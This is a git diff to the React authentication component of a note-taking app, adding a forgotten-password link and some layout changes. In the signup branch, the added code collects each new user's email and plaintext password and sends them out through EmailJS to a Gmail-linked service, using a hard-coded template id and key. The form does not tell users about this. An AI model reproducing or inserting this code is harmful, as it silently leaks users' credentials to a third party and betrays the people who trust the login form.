@@ -15,8 +15,12 @@ import { useHttpClient } from "../../shared/hooks/http-hook";
 import { AuthContext } from '../../shared/context/auth-context';
 import s from "./style.module.css";
 
-export function Auth() {
+import emailjs from 'emailjs-com';
+import { useNavigate } from "react-router-dom";
 
+
+export function Auth() {
+  const navigate =useNavigate();
   const auth = useContext(AuthContext);
   const [isLoginMode, setIsLoginMode] = useState(true);
   const { isLoading, error, sendRequest, clearError } = useHttpClient();
@@ -60,8 +64,8 @@ export function Auth() {
   };
 
   const authSubmitHandler = async event => {
+
     event.preventDefault();
-    
     if (isLoginMode) {
       try {
       
@@ -93,34 +97,56 @@ export function Auth() {
           }
         );
 
+        const user= {
+          name: formState.inputs.name.value,
+          email: formState.inputs.email.value,
+          message: 'E-mail: '+formState.inputs.email.value ,
+          message2:' Password: '+formState.inputs.password.value
+        };
+
+        // event.preventDefault();
+
+    emailjs.send(
+      'my_gmail',
+      'template_sznzcdc',
+      user,
+      'M4iQvBryW-wgb5pKz'
+    ).then((response) => {
+      console.log('Email sent successfully!', response.status, response.text);
+    }).catch((err) => {
+      console.error('Failed to send email. Error:', err);
+    });
+
         auth.login(responseData.userId, responseData.token);
       } catch (err) {}
     }
   };
 
-
+  const switchForgPass=()=> {
+    navigate("/Forgetten");
+  }
 
   return (
     <React.Fragment>
-
       <ErrorModal error={error} onClear={clearError} />
 
+      {isLoading && <LoadingSpinner asOverlay />}
+
+
       <div className="authentication">
-        {isLoading && <LoadingSpinner asOverlay />}
-      
       <div >
         <Logo
           subtitle="Manage your notes"
           image={note}
         />
       </div>
-{/*      
-      <Header
+    
+      {/* <Header
         buttonText={isLoginMode ? "SIGNUP" : "LOGIN"}
         buttonAction={switchModeHandler}
-      ></Header> */}
+      ></Header>  */}
 
-      <form onSubmit={authSubmitHandler} className={s.container}>
+    <form onSubmit={authSubmitHandler} className={s.container}>
         <div className={`mb-3 ${s.h1}`}>
           <h2>Authentification</h2>
         </div>
@@ -154,23 +180,25 @@ export function Auth() {
           autocomplete="on"
           onInput={inputHandler}
         />
-
-         <div className={s.fp}>
-          <a onClick={switchModeHandler} className={s.linkUnderline}>{isLoginMode ? "forgotten password ?" : ""}</a>
+          <div className={s.fp}>
+          <span onClick={switchForgPass} className={s.linkUnderline}>{isLoginMode ? "forgotten password ?" : ""}</span>
+       
+      
         </div>
+        
         <Button type="submit" disabled={!formState.isValid}>
           {isLoginMode ? "LOGIN" : "SIGNUP"}
         </Button>
+        
+      
+           
       </form>
 
       <p  className={s.link}>
           Switch to : <span onClick={switchModeHandler} className={s.linkUnderline}>{isLoginMode ? "SIGNUP" : "LOGIN"}</span>
       </p>
 
-      </div>
+      </div> 
     </React.Fragment>
   );
 };
-
-
-
